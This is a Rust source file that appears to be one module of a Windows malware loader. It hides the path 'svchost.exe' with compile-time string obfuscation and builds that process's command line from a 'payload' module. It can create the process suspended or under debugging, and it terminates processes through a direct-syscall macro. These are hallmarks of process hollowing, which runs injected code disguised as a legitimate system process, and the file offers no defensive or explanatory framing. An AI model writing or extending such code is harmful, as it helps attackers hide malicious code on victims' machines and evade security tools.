use core::{
    mem::{size_of, zeroed},
    ptr::null_mut,
};

use alloc::string::String;
use alloc::borrow::ToOwned;
use windows_sys::Win32::System::Threading::{
    CREATE_NEW_CONSOLE, CREATE_SUSPENDED, CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA,
};
use windows_sys::Win32::{Foundation::GetLastError, System::Threading::DEBUG_ONLY_THIS_PROCESS};

pub fn get_cmdline() -> String {
    obfstr::obfstr! {
        let target_process = "C:\\Windows\\System32\\svchost.exe ";
    };
    target_process.to_owned() + crate::payload::PE_ARGS + "\0"
}

pub unsafe fn create_process(
    suspended: bool,
    debug: bool,
    use_console: bool,
) -> Result<PROCESS_INFORMATION, u32> {
    unsafe {
        let mut target_cmdline = get_cmdline();
        let mut si: STARTUPINFOA = zeroed();
        let mut pi: PROCESS_INFORMATION = zeroed();
        si.cb = size_of::<STARTUPINFOA>() as u32;

        let mut process_flags = 0;

        if suspended {
            process_flags |= CREATE_SUSPENDED;
        }

        if debug {
            process_flags |= DEBUG_ONLY_THIS_PROCESS;
        }

        if use_console {
            process_flags |= CREATE_NEW_CONSOLE;

            // Set flags to use standard handles
            // si.dwFlags |= STARTF_USESTDHANDLES;

            // let rtl_params = (*NtCurrentPeb()).ProcessParameters.as_ref().unwrap();

            // // Get and assign std handles
            // si.hStdInput = rtl_params.StandardInput as isize;
            // si.hStdOutput = rtl_params.StandardOutput as isize;
            // si.hStdError = rtl_params.StandardError as isize;
        }

        let result = CreateProcessA(
            null_mut(),                          // lpApplicationName
            target_cmdline.as_mut_ptr() as _, // lpCommandLine (must be mutable, but &str is OK here)
            null_mut(),                       // lpProcessAttributes
            null_mut(),                       // lpThreadAttributes
            use_console as _,                 // bInheritHandles must be TRUE if using std handles
            process_flags,                    // dwCreationFlags
            null_mut(),                       // lpEnvironment
            null_mut(),                       // lpCurrentDirectory
            &mut si as *mut STARTUPINFOA,     // lpStartupInfo
            &mut pi as *mut PROCESS_INFORMATION, // lpProcessInformation
        );

        if result == 0 {
            return Err(GetLastError());
        }

        Ok(pi)
    }
}

pub unsafe fn terminate(handle: isize) {
    unsafe {
        let _ = crate::syscall!("NtTerminateProcess", handle, 0);
    }
}
